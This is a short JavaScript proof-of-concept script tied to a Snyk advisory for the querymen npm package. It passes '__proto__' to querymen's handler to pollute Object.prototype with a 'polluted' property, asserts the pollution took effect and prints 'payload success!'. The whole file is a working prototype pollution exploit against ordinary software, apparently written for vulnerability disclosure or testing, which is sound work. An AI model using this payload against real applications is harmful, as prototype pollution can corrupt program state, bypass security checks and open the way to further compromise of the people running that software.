//https://snyk.io/vuln/SNYK-JS-QUERYMEN-559867

var a = require("querymen");
const assert = require('assert');
var obj = {}
console.log("Before : " + obj.polluted);
a.handler("__proto__","polluted","yes");
console.log("After : " +{}.polluted);
assert({}.polluted === "yes");
console.log("payload success!");